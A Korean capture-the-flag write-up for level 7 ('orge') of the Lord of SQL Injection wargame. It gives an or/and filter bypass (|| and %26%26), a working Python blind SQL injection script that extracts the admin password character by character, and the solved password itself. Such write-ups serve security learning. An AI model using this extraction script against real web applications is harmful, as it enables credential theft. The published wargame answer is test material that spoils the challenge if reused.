---
title: LOS - 7번 orge
category: Lord of SQL Injection
---

# [07] orge

## 문제

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbQxKQf%2FbtrnlmsKa5t%2FkOxOU4EvB5DqdsYjWKBc90%2Fimg.png">

## 풀이
                     
천천히 살펴보면, 4번 문제와 6번 문제를 합쳐놓았다는 것을 알 수 있다.

- 4번 Blind SQLi + 6번 or/and 필터링

<br> 

4번 문제를 풀 때 썼던 **Blind SQLi 자동화 코드**에

6번 문제를 풀 때 썼던 **or/and 필터링 우회 방법**을 적용시켜주면 될 것 같다.

<br>

따라서 자동화 코드의 파라미터 부분을 다음과 같이 수정해준다.


```
param=f"?{param_name}=' || id=\"admin\" %26%26 length({param_name})={num} %23"
```

1. or ⇒ \|\|

2. and ⇒ %26%26

<br>

```python
import requests

def check_length(url, cookie, param_name):
    head = {"PHPSESSID":f"{cookie}"}
    print("대상 문자열의 길이를 확인중입니다..")
    for num in range(0,30):
        param=f"?{param_name}=' || id=\"admin\" %26%26 length({param_name})={num} %23"
        my_url=url+param
        res=requests.get(my_url, cookies=head)
        if("Hello admin" in res.text):
            return num

def blind_sqli(url, cookie, param_name, length):
    head = {"PHPSESSID":f"{cookie}"}
    ans=""
    for len in range(1, length+1):
        print(f"{len}번째 문자에 대해 검색중입니다..")
        for ran in range(32,127):
            param=f"?{param_name}=' || id=\"admin\" %26%26 ascii(substr({param_name},{len},1))={ran} %23"
            my_url=url+param
            res=requests.get(my_url, cookies=head)
            if("Hello admin" in res.text):
                print(f"{len}번째 문자 → {chr(ran)}")
                ans+=chr(ran)
                break
    return ans

if __name__ == "__main__":
    print("💘 Blind 공격을 시작합니다")
    
    url=input("URL을 입력하세요:")
    cookie=input("cookie를 알려주세요:")
    param_name=input("파라미터의 이름을 알려주세요:")
    
    length=check_length(url, cookie, param_name)
    print(f"👏 {param_name}의 길이는 {length}입니다.")
    
    ans=blind_sqli(url, cookie, param_name, length)
    print(f"👏 {param_name}의 정체는 {ans}입니다!")
    
    exit
```

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbFBWIL%2FbtrndGfEk8V%2FveTAKHtfAiuNDsNIMxDHhk%2Fimg.png">

Blind 공격 결과, admin의 pw는 `7b751aec` 임을 알 수 있다.

## 결과
                     
<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbvEs0U%2FbtrnlnZu1Od%2F8RZ9nKvoAsYBx7nWkpj9KK%2Fimg.png">